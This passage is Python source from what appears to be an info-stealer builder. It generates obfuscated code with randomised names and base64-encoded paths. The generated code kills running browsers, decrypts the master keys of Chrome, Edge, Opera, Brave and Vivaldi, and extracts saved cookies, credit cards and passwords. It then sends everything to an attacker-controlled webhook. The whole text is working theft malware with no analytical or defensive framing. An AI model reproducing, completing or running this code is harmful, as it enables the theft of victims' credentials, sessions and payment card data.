    {operagx_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass

try:
    {cookies_variable_name} += "\\nOpera Gx\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {operagx_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass


try:
    {brave_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcTG9jYWwgU3RhdGU=").decode())
except:
    pass

try:
    {cookies_variable_name} += "\\nBrave\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdFxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {brave_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass


try:
    {vivaldi_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXExvY2FsIFN0YXRl").decode())
except:
    pass

try:
    {cookies_variable_name} += "\\nVivaldi\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {vivaldi_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass
    
try:
    {cookies_variable_name} += "\\nVivaldi P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMVxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {vivaldi_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass
    
try:
    {cookies_variable_name} += "\\nVivaldi P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMlxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {vivaldi_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass
    
try:
    {cookies_variable_name} += "\\nVivaldi P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgM1xOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {vivaldi_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass
    

encoder = MultipartEncoder(''' + '''{'payload_json': json.dumps({
    "username": base64.b64decode("UmVqYWNrZXI=").decode(),
    "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode()
}), 'file': (f'scxvsdgfgczw.txt',''' + cookies_variable_name + ''', 'application/txt')})
requests.post(''' + webhooklink_var_name +''', headers={'Content-type': encoder.content_type}, data=encoder)
    
'''


    if (get_browser_credit_cards.get() == 1):
        encrypted_key_get_fuction_name_var = ''.join(random.choices(string.ascii_lowercase, k=10))
        encrypted_use_decrypt_data_fuction_name_var = ''.join(random.choices(string.ascii_lowercase, k=10))

        cards_variable_name = ''.join(random.choices(string.ascii_lowercase, k=10))

        chrome_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        opera_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        operagx_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        edge_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        brave_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        vivaldi_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        app_source_code_str += f'''  
import os
import sqlite3
import os
import sqlite3
import base64
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
import json

def {encrypted_key_get_fuction_name_var}(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    lcoalstate = json.loads(c)
    keyprosds = base64.b64decode(lcoalstate["os_crypt"]["encrypted_key"])
    keyprosds = keyprosds[5:]
    keyprosds = CryptUnprotectData(keyprosds, None, None, None, 0)[1]
    return keyprosds


def {encrypted_use_decrypt_data_fuction_name_var}(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    cozulmusveri = cipher.decrypt(payload)
    cozulmusveri = cozulmusveri[:-16].decode()
    return cozulmusveri

{cards_variable_name} = "PC Username: " + os.getenv("UserName") + " PC Name: " + os.getenv("COMPUTERNAME") + "\\n"

os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGJyYXZlLmV4ZQ==").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG9wZXJhLmV4ZQ==").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIHZpdmFsZGkuZXhl").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGNocm9tZS5leGU=").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG1zZWRnZS5leGU=").decode())



try:
    {cards_variable_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXExvY2FsIFN0YXRl").decode())
except:
    pass
try:
    {cards_variable_name} += "\\nChrome\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcV2ViIERhdGE=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {chrome_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass

try:
    {cards_variable_name} += "\\nChrome P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMVxXZWIgRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {chrome_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass

try:
    {cards_variable_name} += "\\nChrome P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMlxXZWIgRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {chrome_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass

try:
    {cards_variable_name} += "\\nChrome P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgM1xXZWIgRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {chrome_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass


try:
    {edge_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass
try:
    {cards_variable_name} += "\\nEdge\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XFdlYiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {edge_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass

try:
    {cards_variable_name} += "\\nEdge P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDFcV2ViIERhdGE=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {edge_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass

try:
    {cards_variable_name} += "\\nEdge P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDJcV2ViIERhdGE=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {edge_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass

try:
    {cards_variable_name} += "\\nEdge P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDNcV2ViIERhdGE=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {edge_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass


try:
    {opera_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass

try:
    {cards_variable_name} += "\\nOpera\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxEZWZhdWx0XFdlYiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {opera_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass


try:
    {operagx_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass

try:
    {cards_variable_name} += "\\nOpera Gx\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxXZWIgRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {operagx_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass


try:
    {brave_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcTG9jYWwgU3RhdGU=").decode())
except:
    pass

try:
    {cards_variable_name} += "\\nBrave\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdFxXZWIgRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {brave_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass


try:
    {vivaldi_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXExvY2FsIFN0YXRl").decode())
except:
    pass

try:
    {cards_variable_name} += "\\nVivaldi\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHRcV2ViIERhdGE=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {vivaldi_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass
    
try:
    {cards_variable_name} += "\\nVivaldi P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMVxXZWIgRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {vivaldi_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass
    
try:
    {cards_variable_name} += "\\nVivaldi P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMlxXZWIgRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {vivaldi_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass
    
try:
    {cards_variable_name} += "\\nVivaldi P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgM1xXZWIgRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHM=").decode()):
        {cards_variable_name} += "\\n" + str(row[0]) + " Name On Card: " + str(row[1]) + " Month: " + str(row[2]) + " Year: " + str(row[3]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[4], {vivaldi_deckey_var_name}) + " , " + str(row[5]) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + "\\n"
except:
    pass
    

encoder = MultipartEncoder(''' + '''{'payload_json': json.dumps({
    "username": base64.b64decode("UmVqYWNrZXI=").decode(),
    "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode()
}), 'file': (f'scxvsdgfgczw.txt',''' + cards_variable_name + ''', 'application/txt')})
requests.post(''' + webhooklink_var_name +''', headers={'Content-type': encoder.content_type}, data=encoder)
    
'''



    if (get_browser_passwords.get() == 1):
        encrypted_key_get_fuction_name_var = ''.join(random.choices(string.ascii_lowercase, k=10))
        encrypted_use_decrypt_data_fuction_name_var = ''.join(random.choices(string.ascii_lowercase, k=10))

        passwords_variable_name = ''.join(random.choices(string.ascii_lowercase, k=10))

        chrome_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        opera_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        operagx_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        edge_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        brave_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        vivaldi_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        app_source_code_str += f'''  
import os
import sqlite3
import os
import sqlite3
import base64
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
import json

def {encrypted_key_get_fuction_name_var}(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    lcoalstate = json.loads(c)
    keyprosds = base64.b64decode(lcoalstate["os_crypt"]["encrypted_key"])
    keyprosds = keyprosds[5:]
    keyprosds = CryptUnprotectData(keyprosds, None, None, None, 0)[1]
    return keyprosds


def {encrypted_use_decrypt_data_fuction_name_var}(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    cozulmusveri = cipher.decrypt(payload)
    cozulmusveri = cozulmusveri[:-16].decode()
    return cozulmusveri

{passwords_variable_name} = "PC Username: " + os.getenv("UserName") + " PC Name: " + os.getenv("COMPUTERNAME") + "\\n"

os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGJyYXZlLmV4ZQ==").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG9wZXJhLmV4ZQ==").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIHZpdmFsZGkuZXhl").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGNocm9tZS5leGU=").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG1zZWRnZS5leGU=").decode())



try:
    {passwords_variable_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXExvY2FsIFN0YXRl").decode())
except:
    pass
try:
    {passwords_variable_name} += "\\nChrome\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {chrome_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass

try:
    {passwords_variable_name} += "\\nChrome P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMVxMb2dpbiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {chrome_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass

try:
    {passwords_variable_name} += "\\nChrome P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMlxMb2dpbiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {chrome_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass

try:
    {passwords_variable_name} += "\\nChrome P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgM1xMb2dpbiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {chrome_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass


try:
    {edge_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass
try:
    {passwords_variable_name} += "\\nEdge\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGE=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {edge_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass

try:
    {passwords_variable_name} += "\\nEdge P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDFcTG9naW4gRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {edge_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass

try:
    {passwords_variable_name} += "\\nEdge P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDJcTG9naW4gRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {edge_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass

try:
    {passwords_variable_name} += "\\nEdge P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDNcTG9naW4gRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
